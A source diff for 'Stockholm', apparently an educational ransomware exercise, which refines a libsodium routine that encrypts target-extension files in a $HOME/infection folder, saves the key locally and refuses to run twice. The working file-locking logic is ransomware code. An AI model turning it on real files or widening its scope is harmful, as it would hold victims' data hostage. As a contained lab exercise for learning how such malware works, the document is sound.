@@ -1,14 +1,18 @@
 #include "../include/Stockholm.hpp"
 
-Stockholm::Stockholm() : _reverse(false) , _silent(false)
+Stockholm::Stockholm()
+			: _reverse(false)
+			, _silent(false)
 {
 	if (sodium_init() < 0)
 		throw std::runtime_error("libsodium initialization failed.");
 
-	this->_infection_folder = "/home/infection";
+	const char* home = getenv("HOME");
+	if (!home)
+		throw std::runtime_error("HOME environment variable not set.");
+	this->_infection_folder = std::string(home) + "/infection";
 
 	this->_key.resize(crypto_secretstream_xchacha20poly1305_KEYBYTES);
-	crypto_secretstream_xchacha20poly1305_keygen(_key.data());
 }
 
 Stockholm::~Stockholm() {}
@@ -55,6 +59,9 @@ void	Stockholm::encryptFile(const fs::path& sourcePath)
 		if (!target.is_open())
 			throw std::runtime_error("cannot open target file.");
 
+		source.exceptions(std::ios::badbit);
+		target.exceptions(std::ios::failbit | std::ios::badbit);
+
 		std::vector<unsigned char> bufIn(CHUNK_SIZE);
 		std::vector<unsigned char> bufOut(CHUNK_SIZE + crypto_secretstream_xchacha20poly1305_ABYTES);
 		std::vector<unsigned char> header(crypto_secretstream_xchacha20poly1305_HEADERBYTES);
@@ -74,9 +81,14 @@ void	Stockholm::encryptFile(const fs::path& sourcePath)
 
 			unsigned long long outLen;
 			crypto_secretstream_xchacha20poly1305_push(
-				&state, bufOut.data(), &outLen,
-				bufIn.data(), bytesRead,
-				NULL, 0, tag
+				&state,
+				bufOut.data(),
+				&outLen,
+				bufIn.data(),
+				bytesRead,
+				NULL,
+				0,
+				tag
 			);
 
 			target.write(reinterpret_cast<char*>(bufOut.data()), outLen);
@@ -98,6 +110,12 @@ void	Stockholm::encryptFile(const fs::path& sourcePath)
 	}
 	catch(const std::exception& e)
 	{
+		try
+		{
+			if (fs::exists(targetPath))
+				fs::remove(targetPath);
+		} catch (...) {}
+
 		if (!this->_silent)
 		{
 			std::cerr << "Error: " << sourcePath << "cannot encrypt file: ";
@@ -121,6 +139,9 @@ void	Stockholm::decryptFile(const fs::path& sourcePath)
 		if (!target.is_open())
 			throw std::runtime_error("cannot open target file.");
 
+		source.exceptions(std::ios::badbit);
+		target.exceptions(std::ios::failbit | std::ios::badbit);
+
 		std::vector<unsigned char> bufIn(CHUNK_SIZE + crypto_secretstream_xchacha20poly1305_ABYTES);
 		std::vector<unsigned char> bufOut(CHUNK_SIZE);
 		std::vector<unsigned char> header(crypto_secretstream_xchacha20poly1305_HEADERBYTES);
@@ -132,7 +153,9 @@ void	Stockholm::decryptFile(const fs::path& sourcePath)
 		crypto_secretstream_xchacha20poly1305_state state;
 
 		if (crypto_secretstream_xchacha20poly1305_init_pull(
-				&state, header.data(), _key.data()
+				&state,
+				header.data(),
+				_key.data()
 			) != 0)
 			throw std::runtime_error("invalid key or corrupt header.");
 
@@ -148,10 +171,15 @@ void	Stockholm::decryptFile(const fs::path& sourcePath)
 			unsigned long long outLen;
 			unsigned char tag;
 			if (crypto_secretstream_xchacha20poly1305_pull(
-					&state, bufOut.data(), &outLen, &tag,
-					bufIn.data(), bytesRead,
-					NULL, 0)
-				!= 0)
+					&state,
+					bufOut.data(),
+					&outLen,
+					&tag,
+					bufIn.data(),
+					bytesRead,
+					NULL,
+					0
+				) != 0)
 				throw std::runtime_error("invalid key.");
 
 			target.write(reinterpret_cast<char*>(bufOut.data()), outLen);
@@ -177,8 +205,12 @@ void	Stockholm::decryptFile(const fs::path& sourcePath)
 	}
 	catch (const std::exception& e)
 	{
-		if (fs::exists(targetPath))
-			fs::remove(targetPath);
+		try
+		{
+			if (fs::exists(targetPath))
+				fs::remove(targetPath);
+		} catch (...) {}
+
 		if (!this->_silent)
 		{
 			std::cerr << "Error: " << sourcePath.filename() << "cannot decrypt file: ";
@@ -191,14 +223,23 @@ void	Stockholm::wannaLock()
 {
 	checkInfectionDirectory();
 
-	std::string key_str = getKeyAsString();
+	for (const auto& file : fs::directory_iterator(this->_infection_folder))
+	{
+		if (file.is_regular_file() && file.path().extension() == ".ft")
+		{
+			if (!this->_silent)
+				std::cerr << "Error: already encrypted files found, decrypt first." << std::endl;
+			return;
+		}
+	}
 
 	fs::path keyFilePath = "encryption_key.txt";
 	std::ofstream keyFile(keyFilePath);
 	if (!keyFile.is_open())
 		throw std::runtime_error("cannot open encryption_key.txt file.");
 
-	keyFile << key_str;
+	crypto_secretstream_xchacha20poly1305_keygen(_key.data());
+	keyFile << getKeyAsString();
 	keyFile.close();
 
 	if (!this->_silent)
@@ -213,6 +254,7 @@ void	Stockholm::wannaLock()
 		if (file.is_regular_file())
 		{
 			std::string ext = file.path().extension().string();
+			std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);
 			if (isTargetExtension(ext))
 				encryptFile(file.path());
 			else if (ext == ".ft" && !this->_silent)
